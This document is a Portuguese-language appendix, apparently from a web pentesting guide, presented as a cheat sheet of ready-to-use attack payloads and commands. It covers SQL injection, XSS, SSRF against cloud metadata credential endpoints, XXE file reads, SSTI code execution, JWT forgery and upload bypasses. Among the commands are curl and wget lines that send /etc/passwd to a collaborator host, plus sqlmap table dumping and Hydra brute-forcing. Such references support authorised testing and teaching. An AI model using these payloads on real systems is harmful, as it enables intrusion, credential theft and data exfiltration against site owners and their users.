# Apêndice B — Referência Rápida: Cheat Sheet de Payloads e Comandos

## SQL Injection

**Básico**
```
' OR '1'='1
' OR '1'='1'--
' OR 1=1--
' OR 1=1#
admin'--
admin'/*
```

**UNION SELECT**
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

**Blind**
```
' AND 1=1--
' AND 1=2--
' AND SUBSTRING((SELECT database()),1,1)='a'--
' AND LENGTH((SELECT password FROM users LIMIT 1))>10--
```

**Time-based**
```
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
'; WAITFOR DELAY '0:0:5'--
```

---

## XSS

**Básico**
```
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<script>alert(String.fromCharCode(88,83,83))</script>
```

**Event handlers**
```
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<details open ontoggle=alert('XSS')>
```

**Bypass**
```
<ScRiPt>alert('XSS')</ScRiPt>
javascript:alert('XSS')
data:text/html,<script>alert('XSS')</script>
```

**Polyglot**
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
```

---

## SSRF

**Básico**
```
http://127.0.0.1
http://localhost
http://[::1]
http://0x7f000001
http://2130706433
```

**Cloud metadata**
```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

**Bypass**
```
http://127.0.0.1%0d%0a
http://httpbin.org/redirect-to?url=http://127.0.0.1
http://127.1
http://0177.0.0.1
http://0x7f.0x0.0x0.0x1
http://localtest.me
```

---

## XXE

**Básico**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```

**Blind (DTD externo)**
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param "<!ENTITY exfil SYSTEM 'http://COLLABORATOR_ID/?data=%data;'>">
%param;
```
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://COLLABORATOR_ID/xxe.dtd">
  %xxe;
]>
<foo>test</foo>
```

---

## Command Injection

**Separadores**
```
; id     | id     || id     && id     `id`     $(id)     %0a     %0d
```

**Exfiltração**
```
; cat /etc/passwd
; curl http://BURP_ID.burpcollaborator.net/?data=$(cat /etc/passwd)
; wget http://BURP_ID.burpcollaborator.net/?data=$(whoami)
```

---

## SSTI

**Jinja2 (Python)**
```
{{7*7}}
{{config.items()}}
{{''.__class__.__mro__[2].__subclasses__()}}
```

**Twig (PHP)**
```
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**Freemarker (Java)**
```
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
```

---

## JWT

**Alg none**
```
Header:  {"alg":"none","typ":"JWT"}
Payload: {"username":"admin","role":"admin"}
Montar:  header.payload.    ← ponto final, sem assinatura
```

**Cracking**
```bash
hashcat -m 16500 jwt.txt wordlist.txt
jwt_tool <JWT> -C -d wordlist.txt
jwt_tool <JWT> -X k        # key injection RS256→HS256
```

---

## File Upload

**Extensões alternativas**
```
.php .phtml .php5 .php7 .pht .phps
.asp .aspx .asa .asax .ascx .ashx
.jsp .jspx .jspa .jsw .jsv
```

**Bypass de filtro**
```
shell.php.jpg    shell.php%00.jpg    shell.pHp
shell.php::$DATA shell.php;.         shell.php...
```

**Magic bytes**
```
GIF89a (GIF) · \x89PNG (PNG) · \xFF\xD8\xFF (JPG) · %PDF-1.4 (PDF)
```

---

## Comandos Úteis

**ffuf**
```bash
ffuf -u https://alvo/FUZZ -w wordlist.txt -mc 200,301,302,403 -t 5 -p 0.5
ffuf -u https://alvo -H "Host: FUZZ.alvo" -w subdomains.txt -fs 0
```

**httpx**
```bash
httpx -l vivos.txt -silent -status-code -title
```

**whatweb / curl**
```bash
whatweb https://alvo -v
curl -I -s https://alvo
curl -X OPTIONS -s -I https://alvo/api/users   # Allow header
```

**Nuclei**
```bash
nuclei -u https://alvo -severity critical,high -o out.txt
nuclei -u https://alvo -tags sqli,xss,ssrf
nuclei -l urls.txt -rate-limit 10
```

**SQLMap**
```bash
sqlmap -u "URL" --batch --risk=1 --level=2
sqlmap -u "URL" --batch --dbs
sqlmap -u "URL" --batch -D db -T tabela --dump
```

**Hydra**
```bash
hydra -l admin -P rockyou.txt alvo https-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" -w 5
```

**Voltar ao índice:** [README](README.md)
